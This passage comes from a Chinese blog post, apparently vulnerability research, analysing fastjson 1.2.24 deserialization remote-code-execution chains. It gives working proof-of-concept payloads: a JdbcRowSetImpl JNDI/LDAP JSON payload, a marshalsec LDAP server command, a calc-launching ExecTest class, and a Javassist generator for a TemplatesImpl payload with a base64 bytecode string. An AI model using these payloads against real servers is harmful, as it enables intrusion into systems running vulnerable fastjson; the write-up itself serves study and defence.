class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse(jsonStr)</span><br><span class="line">parseObject(jsonStr)</span><br><span class="line">parseObject(jsonStr,Object.class)</span><br></pre></td></tr></table></figure></p><p>当然JDK版本有特殊需求，在JNDI注入一文中已说过，这里就不再说明</p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>在JNDI注入一文中我们已经介绍了利用链，把漏洞触发代码从</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;<span class="comment">//可控uri</span></span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(uri);</span><br></pre></td></tr></table></figure><p>衍生到了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="keyword">new</span> JdbcRowSetImpl();<span class="comment">//只是为了方便调用</span></span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">"rmi://127.0.0.1:1099/aa"</span>);<span class="comment">//可控uri</span></span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面尝试用fastjson的@type来使服务端执行以上代码，可以看到我们需要调用的两个函数都是以set开头！这说明我们可以把这个函数当作setter函数进行调用！</p><p>去看一下这两个函数接口符不符合setter函数的条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public void setDataSourceName(String var1) throws SQLException</span><br><span class="line">public void setAutoCommit(boolean var1)throws SQLException</span><br></pre></td></tr></table></figure><ul><li style="list-style: none"><input type="checkbox" checked> 方法名长度大于4且以set开头，且第四个字母要是大写</li><li style="list-style: none"><input type="checkbox" checked> 非静态方法</li><li style="list-style: none"><input type="checkbox" checked> 返回类型为void或当前类</li><li style="list-style: none"><input type="checkbox" checked> 参数个数为1个</li></ul><p>完美符合！直接给出payload！</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "@type":"com.sun.rowset.JdbcRowSetImpl",   //调用com.sun.rowset.JdbcRowSetImpl函数中的</span><br><span class="line">    "dataSourceName":"ldap://127.0.0.1:1389/Exploit",   // setdataSourceName函数 传入参数"ldap://127.0.0.1:1389/Exploit"</span><br><span class="line">    "autoCommit":true // 再调用setAutoCommit函数，传入true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>java环境：jdk1.8.0_161 &lt; 1.8u191 （可以使用ldap注入）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 版本<span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.fastjson.User;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC</span> </span>&#123;</span><br><span class="line">    String payload =   <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用工具起一个ldap服务</p><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8090/#ExecTest</code></p><p>之前的ExecTest.class，也不用修改直接上来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"xterm"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String var0)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在1.8下编译后使用python起web服务</p><p><code>py -3 -m http.server 8090</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26iha62j322q127wut.jpg" alt="jndi计算器.png"></p><h2 id="【-lt-1-2-24】JDK1-7-的TemplatesImpl利用链"><a href="#【-lt-1-2-24】JDK1-7-的TemplatesImpl利用链" class="headerlink" title="【&lt;=1.2.24】JDK1.7 的TemplatesImpl利用链"></a>【&lt;=1.2.24】JDK1.7 的TemplatesImpl利用链</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>基于<code>JDK1.7u21 Gadgets</code> 的触发点TemplatesImple的利用条件比较苛刻：</p><ol><li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：<br><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li><li>服务端使用parse()时，需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li></ol><p>这是因为payload需要赋值的一些属性为private属性，服务端必须添加特性才回去从json中恢复private属性的数据</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae265y6ofj30ze0t676p.jpg" alt="private属性.png"></p><blockquote><p>对于 JDK1.7u21 Gadgets 不熟悉的同学，可以参考我之前的文章。</p><p>在之前的文章也说过，TemplatesImpl对应的整条利用链是只有在JDK1.7u21附近的版本才能使用，但是最后TemplatesImpl这个类的触发点，其实是1.7全版本通用的。（因为修复只砍在了中间环节AnnotationInvocationHandler类）</p><p>那么实际上fastjson正是只利用了最后的TemplatesImpl触发点。这个利用方式实际上是1.7版本通用的。<br>其利用局限性在于服务端反序列化json的语句必须要支持private属性。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25r6kaij31zm0wotma.jpg" alt="1.7u21 TemplatesImpl链计算器.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25jl1alj322s0xzh02.jpg" alt="1.7u80 TemplatesImpl链计算器.png"></p><p>在Github上传的项目中<code>版本24.jdk7u21.java</code>是网上的payload。需要自己编译生成一个class文件不是很方便。</p><p>在<code>版本24.jdk7u21_mine</code>中自己把7u21链的payload中拿过来，自己改了下，可以自动生成payload。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdk7u21_mine</span> </span>&#123;</span><br><span class="line">    <span class="comment">//最终执行payload的类的原始模型</span></span><br><span class="line">    <span class="comment">//ps.要payload在static模块中执行的话，原始模型需要用static方式。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">lala</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回一个在实例化过程中执行任意代码的恶意类的byte码</span></span><br><span class="line">    <span class="comment">//如果对于这部分生成原理不清楚，参考以前的文章</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getevilbyte() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(lala.class.getName());</span><br><span class="line">        <span class="comment">//要执行的最终命令</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">        <span class="comment">//之前说的静态初始化块和构造方法均可，这边用静态方法</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"><span class="comment">//        CtConstructor cons = new CtConstructor(new CtClass[]&#123;&#125;, cc);</span></span><br><span class="line"><span class="comment">//        cons.setBody("&#123;"+cmd+"&#125;");</span></span><br><span class="line"><span class="comment">//        cc.addConstructor(cons);</span></span><br><span class="line">        <span class="comment">//设置不重复的类名</span></span><br><span class="line">        String randomClassName = <span class="string">"LaLa"</span>+System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//设置满足条件的父类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="comment">//获取字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] lalaByteCodes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> lalaByteCodes;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//生成payload，触发payload</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">poc</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//生成攻击payload</span></span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = getevilbyte();<span class="comment">//生成恶意类的字节码</span></span><br><span class="line">        String evilCode_base64 = Base64.encodeBase64String(evilCode);<span class="comment">//使用base64封装</span></span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;"</span>+</span><br><span class="line">                <span class="string">"\"@type\":\""</span> + NASTY_CLASS +<span class="string">"\","</span>+</span><br><span class="line">                <span class="string">"\"_bytecodes\":[\""</span>+evilCode_base64+<span class="string">"\"],"</span>+</span><br><span class="line">                <span class="string">"'_name':'a.b',"</span>+</span><br><span class="line">                <span class="string">"'_tfactory':&#123; &#125;,"</span>+</span><br><span class="line">                <span class="string">"'_outputProperties':&#123; &#125;"</span>+</span><br><span class="line">                <span class="string">"&#125;\n"</span>;</span><br><span class="line">        <span class="comment">//此处删除了一些我觉得没有用的参数（第二个_name，_version，allowedProtocols），并没有发现有什么影响</span></span><br><span class="line">        System.out.println(text1);</span><br><span class="line">        <span class="comment">//服务端触发payload</span></span><br><span class="line">    ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//main函数调用以下poc而已</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            poc();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到payload使用<code>@type</code>反序列化了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类。</p><p>最终payload输出如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADMAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARsYWxhAQAMSW5uZXJDbGFzc2VzAQAcTOeJiOacrDI0L2pkazd1MjFfbWluZSRsYWxhOwEAClNvdXJjZUZpbGUBABFqZGs3dTIxX21pbmUuamF2YQwABAAFBwATAQAa54mI5pysMjQvamRrN3UyMV9taW5lJGxhbGEBABBqYXZhL2xhbmcvT2JqZWN0AQAV54mI5pysMjQvamRrN3UyMV9taW5lAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAFQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABcAGAoAFgAZAQAEY2FsYwgAGwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAB0AHgoAFgAfAQARTGFMYTg4MTIwNDQ1NzYzMDABABNMTGFMYTg4MTIwNDQ1NzYzMDA7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAADwAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&quot;],&apos;_name&apos;:&apos;a.b&apos;,&apos;_tfactory&apos;:&#123; &#125;,&apos;_outputProperties&apos;:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure><p> 7u21 那篇文中总结得到恶意TemplatesImple类需要满足如下条件。</p><ol><li>TemplatesImpl类的 <code>_name</code> 变量 != null</li><li>TemplatesImpl类的<code>_class</code>变量 == null</li><li>TemplatesImpl类的 <code>_bytecodes</code> 变量 != null</li><li>TemplatesImpl类的<code>_bytecodes</code>是我们代码执行的类的字节码。<code>_bytecodes</code>中的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类</li><li>我们需要执行的恶意代码写在<code>_bytecodes</code> 变量对应的类的静态方法或构造方法中。</li><li>TemplatesImpl类的<code>_tfactory</code>需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类</li></ol><p>显而易见1-3，5均符合（_class没有赋值即为null）。</p><p>然后我们调用满足条件的恶意TemplatesImple类的getOutputProperties方法，完成RCE。这是fastjson将自动调用字段的getter方法导致的，我们看一下getOutputProperties方法是否满足自动调用getter方法的条件：</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li style="list-style: none"><input type="checkbox" checked> 方法名长度大于等于4    </li><li style="list-style: none"><input type="checkbox" checked> 非静态方法</li><li style="list-style: none"><input type="checkbox" checked> 以get开头且第4个字母为大写</li><li style="list-style: none"><input type="checkbox" checked> 无传入参数</li><li style="list-style: none"><input type="checkbox" checked> 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong（上面举例的时候说过Properties继承自Hashtables，实现了Map，所以符合）</li></ul><p>那么存在以下三个问题</p><ol><li>为什么<code>_tfactory</code>可以是一个空的对象，而不是一个拥有getExternalExtensionsMap的类？</li><li>_bytecodes为什么不再是字节码，而是需要base64编码？</li><li>我们要调用TemplatesImple类的getOutputProperties方法，但是为什么是<code>_outputProperties</code>字段，多了一个<code>_</code>？</li></ol><h3 id="tfactory为空的说明"><a href="#tfactory为空的说明" class="headerlink" title="_tfactory为空的说明"></a>_tfactory为空的说明</h3><p>在fastjson组件对于以上这一串东西进行解析时，会先解析出@type来还原出TemplatesImpl类。然后再根据之后的字段将TemplatesImpl类的属性赋值，至于赋值的内容会重新进行一次解析。</p><p>在看对于赋值内容的解析步骤时，会发现当赋值的值为一个空的Object对象时，会新建一个需要赋值的字段应有的格式的新对象实例。</p><p><code>/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:627</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae255pusej321d145qc2.jpg" alt="_tfactory为空.png"></p><p><code>/com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java:62</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25093pcj31kb17qwk6.jpg" alt="_tfactory为空2.png"></p><p>那么_tfactory的应有的格式是哪来的呢，从定义来。</p><p><code>/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A reference to the transformer factory that this templates</span></span><br><span class="line"><span class="comment"> * object belongs to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> TransformerFactoryImpl _tfactory = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>所以之所以_tfactory的json字符串的值为空是OK的。</p><h3 id="bytecodes需要base64编码"><a href="#bytecodes需要base64编码" class="headerlink" title="_bytecodes需要base64编码"></a>_bytecodes需要base64编码</h3><p>跟踪<code>_bytecodes</code>字段的值处理，同样还是刚才的地方，但是由于<code>_bytecodes</code>的值不是对象，进入另一个赋值方式。</p><p><code>/com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java:71</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae24s31kmj31hn199n2h.jpg" alt="base64-1.png"></p><p><code>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">//进去后判断字段类型，当前是class[B byte数组，上面啥都不做，进行解析</span></span><br><span class="line">...</span><br><span class="line">      &#125;</span><br><span class="line">      JSONArray array = <span class="keyword">new</span> JSONArray();</span><br><span class="line">      parser.parseArray(componentClass, array, fieldName);<span class="comment">//进入此处</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> (T) toObjectArray(parser, componentClass, array);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseArray(java.lang.reflect.Type, java.util.Collection, java.lang.Object)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//type=class [B byte数组</span></span><br><span class="line"><span class="comment">//fieldName = _bytecodes</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parseArray</span><span class="params">(Type type, Collection array, Object fieldName)</span> </span>&#123;</span><br><span class="line">...<span class="comment">//这边就是在根据type类型进行不同的处理</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">//byte数组进入此处</span></span><br><span class="line">                        val = deserializer.deserialze(<span class="keyword">this</span>, type, i);<span class="comment">//在这句进行解析</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    array.add(val);</span><br><span class="line">                    checkListResolve(array);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (lexer.token() == JSONToken.COMMA) &#123;</span><br><span class="line">                    lexer.nextToken(deserializer.getFastMatchToken());</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.setContext(context);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> JSONLexer lexer = parser.lexer;</span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.NULL) &#123;</span><br><span class="line">            lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//我们输入的json串中， _bytecodes 字段对应的值是String类型字符串，进入此处</span></span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = lexer.bytesValue();<span class="comment">//进入此处，获取json串的值恢复到byte数组</span></span><br><span class="line">            lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">            <span class="keyword">return</span> (T) bytes;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>com.alibaba.fastjson.parser.JSONScanner#bytesValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] bytesValue() &#123;</span><br><span class="line">    <span class="keyword">return</span> IOUtils.decodeBase64(text, np + <span class="number">1</span>, sp);<span class="comment">//base64解码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见在代码逻辑中，字段的值从String恢复成<code>byte[]</code>，会经过一次base64解码。这是应该是fastjson在传输<code>byte[]</code>中做的一个内部规定。序列化时应该也会对byte[]自动base64编码。</p><p>try一下，果然如此。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae246qlpuj314y0zpgpt.jpg" alt="base64-3.png"></p><h3 id="getOutputProperties字段-gt-getOutputProperties方法"><a href="#getOutputProperties字段-gt-getOutputProperties方法" class="headerlink" title="_getOutputProperties字段 =&gt; getOutputProperties方法"></a>_getOutputProperties字段 =&gt; getOutputProperties方法</h3><p>简单的删掉<code>_</code>试一下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23y11clj31z60yftlz.jpg" alt="_outputProperties.png"></p><p>可以发现，并不会对结果造成什么影响，可见这个_不是必须的。</p><p>那么是在哪里对这个_进行了处理呢？</p><p>在字段解析之前，会对于当前字段进行一次智能匹配<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">parseField</span><span class="params">(DefaultJSONParser parser, String key, Object object, Type objectType,</span></span></span><br><span class="line"><span class="function"><span class="params">                              Map&lt;String, Object&gt; fieldValues)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer; </span><br><span class="line">        FieldDeserializer fieldDeserializer = smartMatch(key);<span class="comment">//进入此处，根据json串的字段名来获取字段反序列化解析器。</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> FieldDeserializer <span class="title">smartMatch</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (key == <span class="keyword">null</span>) 